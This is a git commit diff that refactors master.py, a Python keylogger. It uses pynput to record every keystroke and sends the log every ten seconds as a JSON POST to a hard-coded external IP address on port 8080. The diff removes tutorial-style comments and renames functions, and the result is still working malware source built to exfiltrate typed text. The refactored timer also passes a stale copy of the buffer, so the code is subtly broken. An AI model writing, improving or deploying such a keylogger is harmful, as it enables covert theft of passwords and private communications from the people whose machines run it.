06c41edb6f744831631f2b9d43654eac2433e65f
Baelrin <Baelrin-Revel@yandex.ru>
2024-01-24 19:54:04 +0300

    Refactore code

--- master.py
+++ master.py
@@ -1,43 +1,25 @@
-# Install pynput using the following command: pip install pynput
-# Import the mouse and keynboard from pynput
-# To transform a Dictionary to a JSON string we need the json package.
 import json
-
-#  The Timer module is part of the threading package.
 import threading
-
-# We need to import the requests library to Post the data to the server.
 import requests
 from pynput import keyboard
 
-# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
+# Constants
+IP_ADDRESS = "109.74.200.23"
+PORT_NUMBER = "8080"
+TIME_INTERVAL = 10
+
+# Global variable
 text = ""
 
-# Hard code the values of your server and ip address here.
-ip_address = "109.74.200.23"
-port_number = "8080"
-# Time interval in seconds for code to execute.
-time_interval = 10
-
-
-def send_post_req():
+def send_post_request(ip_address, port_number, text):
     try:
-        # We need to convert the Python object into a JSON string. So that we can POST it to the server. Which will look for JSON using
-        # the format {"keyboardData" : "<value_of_text>"}
         payload = json.dumps({"keyboardData": text})
-        # We send the POST Request to the server with ip address which listens on the port as specified in the Express server code.
-        # Because we're sending JSON to the server, we specify that the MIME Type for JSON is application/json.
         requests.post(f"http://{ip_address}:{port_number}",
-                          data=payload, headers={"Content-Type": "application/json"})
-        # Setting up a timer function to run every <time_interval> specified seconds. send_post_req is a recursive function, and will call itself as long as the program is running.
-        timer = threading.Timer(time_interval, send_post_req)
-        # We start the timer thread.
+                      data=payload, headers={"Content-Type": "application/json"})
+        timer = threading.Timer(TIME_INTERVAL, send_post_request, args=(ip_address, port_number, text))
         timer.start()
-    except Exception:
-        print("Couldn't complete request!")
-
-# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
-
+    except Exception as e:
+        print(f"Couldn't complete request! Error: {e}")
 
 def on_press(key):
     global text
@@ -62,11 +44,6 @@ def on_press(key):
         text += str(key).strip("'")
     return None
 
-
-# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
-# In the on_press function we specified how to deal with the different inputs received by the listener.
-with keyboard.Listener(
-        on_press=on_press) as listener:
-    # We start of by sending the post request to our server.
-    send_post_req()
+with keyboard.Listener(on_press=on_press) as listener:
+    send_post_request(IP_ADDRESS, PORT_NUMBER, text)
     listener.join()
